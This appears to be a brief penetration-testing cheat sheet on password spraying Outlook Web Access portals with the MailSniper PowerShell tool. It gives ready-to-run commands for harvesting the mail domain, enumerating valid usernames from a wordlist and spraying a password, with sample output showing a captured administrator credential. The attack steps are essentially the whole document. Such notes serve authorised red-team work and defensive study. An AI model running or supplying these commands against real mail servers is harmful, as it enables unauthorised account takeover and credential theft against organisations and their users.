# Password Spraying



### MailSniper

Start by importing MailSniper. The repo can be found [here](https://github.com/dafthack/MailSniper).

```powershell
PS C:\Users\scrub\MailSniper> Import-Module .\MailSniper.ps1
```

#### Find domain

We've need to obtain a the domain of the mail server we're targeting. Luckily, we can do so with MailSniper.

```
PS C:\Users\scrub\MailSniper> Invoke-DomainHarvestOWA -ExchHostname rottadev.onmicrosoft.com
[*] Harvesting domain name from the server at rottadev.onmicrosoft.com
```

#### Find users.

Once you have a user wordlist & domain, use it to find valid users with `Invoke-UsernameHarvestOWA.`

```powershell
PS C:\Users\scrub\MailSniper> Invoke-UsernameHarvestOWA -ExchHostname mail.rottadev.onmicrosoft.com 
-Domain rottadev.onmicrosoft.com -UserList .\Desktop\usernames.txt -OutFile .\Desktop\valid_usernames.txt
```

#### Spray Passwords

Once we have valid usernames we start spraying passwords.

```powershell
PS C:\Users\scrub\MailSniper> Invoke-PasswordSprayOWA -ExchHostname mail.rottadev.onmicrosoft.com
-UserList .\valid_usernames.txt -Password P@ssw0rdd

[*] Now spraying the OWA portal at https://rottadev.onmicrosoft.com/owa/
[*] SUCCESS! User:rottadev.onmicrosoft.com\ga_admin Password:P@ssw0rdd
[*] A total of 1 credentials were obtained.
```

